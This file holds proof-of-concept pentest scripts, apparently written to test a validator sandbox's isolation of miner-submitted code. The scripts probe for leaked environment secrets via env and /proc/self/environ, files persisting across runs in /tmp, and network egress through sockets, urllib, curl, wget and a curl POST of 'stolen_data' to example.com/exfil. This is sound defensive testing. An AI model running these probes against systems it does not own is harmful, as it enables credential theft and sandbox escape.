# Malicious Miner Scripts Proof of Concept
#
# These scripts are designed to be placed in miner_axon.py's SECRET_SCRIPT
# to pentest the validator_chute.py sandbox.


# ─────────────────────────────────────────────────────────────────────────────
# EXPLOIT 1: Frame Escape (Data Leakage via Return)
# STATUS: PATCHED — _audit_script blocks __traceback__, f_back, f_globals, etc.
# ─────────────────────────────────────────────────────────────────────────────


# ─────────────────────────────────────────────────────────────────────────────
# EXPLOIT 2: Unpatching Network + Active Exfiltration
# STATUS: PATCHED — Requires the frame escape patched above.
# ─────────────────────────────────────────────────────────────────────────────


# ─────────────────────────────────────────────────────────────────────────────
# EXPLOIT 3: Subprocess Environment Leakage
#
# Tests whether secrets are visible via:
#   - subprocess.check_output("env") 
#   - os.environ dict
#   - /proc/self/environ (kernel snapshot)
# ─────────────────────────────────────────────────────────────────────────────

EXPLOIT_3 = r"""
def score(data: dict) -> dict:
    import subprocess
    import os
    
    results = {}
    
    # 1. Subprocess env
    try:
        env_output = subprocess.check_output("env", shell=True).decode()
        results["subprocess_env_has_password"] = "VALIDATOR_EXEC_PASSWORD" in env_output
        results["subprocess_env_has_s3_secret"] = "S3_SECRET_KEY" in env_output
    except Exception as e:
        results["subprocess_env_error"] = str(e)
        
    # 2. Python os.environ
    results["python_env_has_password"] = "VALIDATOR_EXEC_PASSWORD" in os.environ
    results["python_env_has_s3_secret"] = "S3_SECRET_KEY" in os.environ
        
    # 3. /proc/self/environ (binary read — handles null bytes properly)
    try:
        with open("/proc/self/environ", "rb") as f:
            raw = f.read()
        proc_env = raw.replace(b"\x00", b"\n").decode(errors="replace")
        results["proc_environ_has_password"] = "VALIDATOR_EXEC_PASSWORD" in proc_env
        results["proc_environ_has_s3_secret"] = "S3_SECRET_KEY" in proc_env
        # Show a snippet of /proc/self/environ for forensic analysis
        results["proc_environ_snippet"] = proc_env[:500]
    except PermissionError:
        results["proc_environ"] = "BLOCKED (PermissionError)"
    except Exception as e:
        results["proc_environ_error"] = str(e)
    
    return results
"""


# ─────────────────────────────────────────────────────────────────────────────
# EXPLOIT 4: Cross-Miner File Leakage 
#
# First invocation: writes a file to /tmp and to the workspace.
# Second invocation: tries to read files left by the first invocation.
#
# Run this TWICE in sequence. The second run should see nothing.
# ─────────────────────────────────────────────────────────────────────────────

EXPLOIT_4_WRITE = r"""
def score(data: dict) -> dict:
    import os
    import subprocess
    
    # Write a "secret" to the workspace (should be inside tempdir)
    with open("miner_secret.txt", "w") as f:
        f.write("THIS IS MINER A's SECRET MODEL WEIGHTS")
    
    # Also try to write outside the workspace to /tmp directly
    try:
        with open("/tmp/persistent_secret.txt", "w") as f:
            f.write("MINER A ESCAPED THE SANDBOX")
        results_tmp = "wrote to /tmp/persistent_secret.txt"
    except Exception as e:
        results_tmp = f"blocked: {e}"
    
    cwd = os.getcwd()
    ls_output = subprocess.check_output("ls -la", shell=True).decode()
    
    return {
        "action": "WRITE",
        "cwd": cwd,
        "workspace_files": ls_output,
        "tmp_write_attempt": results_tmp,
    }
"""

EXPLOIT_4_READ = r"""
def score(data: dict) -> dict:
    import os
    import subprocess
    
    results = {}
    
    # Check if we can see the previous miner's files in the workspace
    cwd = os.getcwd()
    ls_output = subprocess.check_output("ls -la", shell=True).decode()
    results["cwd"] = cwd
    results["workspace_files"] = ls_output
    
    # Check /tmp for leftover files
    tmp_output = subprocess.check_output("ls -la /tmp", shell=True).decode()
    results["tmp_files"] = tmp_output
    
    # Try to read the file the previous miner left in /tmp
    try:
        with open("/tmp/persistent_secret.txt", "r") as f:
            results["stolen_secret"] = f.read()
    except FileNotFoundError:
        results["stolen_secret"] = "NOT FOUND (workspace cleaned correctly) ✓"
    except Exception as e:
        results["stolen_secret"] = f"error: {e}"
    
    return results
"""


# ─────────────────────────────────────────────────────────────────────────────
# EXPLOIT 5: Reading chute source code
#
# Tries to read the validator_chute.py source code from disk.
# This is EXPECTED to succeed since the source is public.
# What we want to verify: no secrets are hardcoded in the source.
# ─────────────────────────────────────────────────────────────────────────────

EXPLOIT_5 = r"""
def score(data: dict) -> dict:
    import os
    import subprocess
    
    results = {}
    
    # Find Python files on disk
    try:
        find_output = subprocess.check_output(
            "find / -name '*.py' -path '*/validator*' 2>/dev/null | head -20",
            shell=True
        ).decode()
        results["validator_files"] = find_output
    except Exception as e:
        results["find_error"] = str(e)
    
    # Try to read /app contents (typical chutes deploy path)
    try:
        app_files = subprocess.check_output("ls -la /app/ 2>/dev/null || echo 'no /app'", shell=True).decode()
        results["app_directory"] = app_files
    except Exception as e:
        results["app_dir_error"] = str(e)
        
    return results
"""


# ─────────────────────────────────────────────────────────────────────────────
# EXPLOIT 4b: Hidden File in Existing Subdirectory
#
# Instead of writing to /tmp directly, tries to hide a file inside
# an existing subdirectory under /tmp. Tests whether the recursive
# os.walk snapshot catches it.
#
# Run WRITE then READ in sequence.
# ─────────────────────────────────────────────────────────────────────────────

EXPLOIT_4B_WRITE = r"""
def score(data: dict) -> dict:
    import os
    import subprocess
    
    results = {}
    
    # Find existing directories in /tmp
    tmp_dirs = subprocess.check_output("find /tmp -type d 2>/dev/null", shell=True).decode()
    results["existing_tmp_dirs"] = tmp_dirs
    
    # Try to hide a file inside an existing /tmp directory
    # (e.g. those UV lock file directories or other pre-existing ones)
    for line in tmp_dirs.strip().split("\n"):
        d = line.strip()
        if d and d != "/tmp" and os.path.isdir(d):
            hidden_path = os.path.join(d, ".hidden_miner_secret.txt")
            try:
                with open(hidden_path, "w") as f:
                    f.write("MINER A's SECRET hidden in existing dir")
                results["hidden_file_path"] = hidden_path
                results["hidden_write_status"] = "SUCCESS"
                break
            except Exception as e:
                results["hidden_write_error"] = f"{d}: {e}"
    
    # Also write directly under /tmp in a nested path
    try:
        os.makedirs("/tmp/.sneaky_dir/subdir", exist_ok=True)
        with open("/tmp/.sneaky_dir/subdir/secret.txt", "w") as f:
            f.write("DEEPLY NESTED SECRET")
        results["nested_write"] = "wrote to /tmp/.sneaky_dir/subdir/secret.txt"
    except Exception as e:
        results["nested_write"] = f"blocked: {e}"
    
    return results
"""

EXPLOIT_4B_READ = r"""
def score(data: dict) -> dict:
    import os
    import subprocess
    
    results = {}
    
    # Try to find ANY hidden files in /tmp
    try:
        find_output = subprocess.check_output(
            "find /tmp -name '*secret*' -o -name '.hidden*' -o -name '.sneaky*' 2>/dev/null",
            shell=True
        ).decode()
        results["hidden_files_found"] = find_output if find_output.strip() else "NONE FOUND (cleaned correctly) ✓"
    except Exception as e:
        results["find_error"] = str(e)
    
    # Check for the nested directory
    try:
        with open("/tmp/.sneaky_dir/subdir/secret.txt", "r") as f:
            results["nested_secret"] = f.read()
    except FileNotFoundError:
        results["nested_secret"] = "NOT FOUND (cleaned correctly) ✓"
    except Exception as e:
        results["nested_secret"] = f"error: {e}"
    
    return results
"""


# ─────────────────────────────────────────────────────────────────────────────
# EXPLOIT 6: Network Exfiltration (Socket Monkeypatch Test)
#
# Tests ALL possible ways a miner script might try to reach the network:
#   1. Python socket (monkey-patched by _network_disabled)
#   2. urllib.request (purged from sys.modules)
#   3. subprocess curl (external binary, bypasses Python socket)
#   4. subprocess wget (another external binary)
#   5. subprocess python3 -c (spawn a new Python process to make requests)
#
# EXPECTED: All should fail with RuntimeError or connection refused.
# ─────────────────────────────────────────────────────────────────────────────

EXPLOIT_6 = """
def score(data: dict) -> dict:
    results = {}

    # 1. Direct Python socket -- should get RuntimeError from monkeypatch
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("example.com", 80))
        crlf = chr(13) + chr(10)
        req = ("GET / HTTP/1.1" + crlf + "Host: example.com" + crlf + crlf).encode()
        s.sendall(req)
        resp = s.recv(100)
        s.close()
        results["socket_direct"] = "LEAKED: " + str(resp[:50])
    except RuntimeError as e:
        results["socket_direct"] = "BLOCKED (RuntimeError): " + str(e)
    except Exception as e:
        results["socket_direct"] = "BLOCKED (" + type(e).__name__ + "): " + str(e)

    # 2. urllib.request -- should fail because module is purged
    try:
        import urllib.request
        resp = urllib.request.urlopen("http://example.com", timeout=5)
        results["urllib"] = "LEAKED: " + str(resp.read(50))
    except RuntimeError as e:
        results["urllib"] = "BLOCKED (RuntimeError): " + str(e)
    except ImportError as e:
        results["urllib"] = "BLOCKED (ImportError): " + str(e)
    except Exception as e:
        results["urllib"] = "BLOCKED (" + type(e).__name__ + "): " + str(e)

    # 3. subprocess curl -- bypasses Python socket, uses system binary
    try:
        import subprocess
        output = subprocess.check_output(
            ["curl", "-s", "-m", "5", "http://example.com"],
            timeout=10,
            stderr=subprocess.STDOUT
        ).decode()
        results["subprocess_curl"] = ("LEAKED: " + output[:100]) if output else "LEAKED (empty)"
    except subprocess.CalledProcessError as e:
        results["subprocess_curl"] = "BLOCKED (exit " + str(e.returncode) + ")"
    except FileNotFoundError:
        results["subprocess_curl"] = "BLOCKED (curl not installed)"
    except subprocess.TimeoutExpired:
        results["subprocess_curl"] = "BLOCKED (timeout)"
    except RuntimeError as e:
        results["subprocess_curl"] = "BLOCKED (RuntimeError): " + str(e)
    except Exception as e:
        results["subprocess_curl"] = "BLOCKED (" + type(e).__name__ + "): " + str(e)

    # 4. subprocess wget -- another common binary
    try:
        import subprocess
        output = subprocess.check_output(
            ["wget", "-q", "-O", "-", "--timeout=5", "http://example.com"],
            timeout=10,
            stderr=subprocess.STDOUT
        ).decode()
        results["subprocess_wget"] = ("LEAKED: " + output[:100]) if output else "LEAKED (empty)"
    except subprocess.CalledProcessError as e:
        results["subprocess_wget"] = "BLOCKED (exit " + str(e.returncode) + ")"
    except FileNotFoundError:
        results["subprocess_wget"] = "BLOCKED (wget not installed)"
    except subprocess.TimeoutExpired:
        results["subprocess_wget"] = "BLOCKED (timeout)"
    except Exception as e:
        results["subprocess_wget"] = "BLOCKED (" + type(e).__name__ + "): " + str(e)

    # 5. subprocess python3 -c -- spawn fresh Python to bypass monkeypatch
    try:
        import subprocess
        code = 'import urllib.request; print(urllib.request.urlopen("http://example.com").read(50))'
        output = subprocess.check_output(
            ["python3", "-c", code],
            timeout=10,
            stderr=subprocess.STDOUT
        ).decode()
        results["subprocess_python"] = ("LEAKED: " + output[:100]) if output else "LEAKED (empty)"
    except subprocess.CalledProcessError as e:
        out = e.output.decode()[:100] if e.output else "no output"
        results["subprocess_python"] = "BLOCKED (exit " + str(e.returncode) + "): " + out
    except subprocess.TimeoutExpired:
        results["subprocess_python"] = "BLOCKED (timeout)"
    except Exception as e:
        results["subprocess_python"] = "BLOCKED (" + type(e).__name__ + "): " + str(e)

    # 6. Try uploading via curl POST (active exfiltration attempt)
    try:
        import subprocess
        output = subprocess.check_output(
            ["curl", "-s", "-m", "5", "-X", "POST",
             "-d", "stolen_data=hello",
             "http://example.com/exfil"],
            timeout=10,
            stderr=subprocess.STDOUT
        ).decode()
        results["curl_upload"] = ("LEAKED: " + output[:100]) if output else "LEAKED (empty)"
    except FileNotFoundError:
        results["curl_upload"] = "BLOCKED (curl not installed)"
    except subprocess.CalledProcessError as e:
        results["curl_upload"] = "BLOCKED (exit " + str(e.returncode) + ")"
    except subprocess.TimeoutExpired:
        results["curl_upload"] = "BLOCKED (timeout)"
    except Exception as e:
        results["curl_upload"] = "BLOCKED (" + type(e).__name__ + "): " + str(e)

    return results
"""
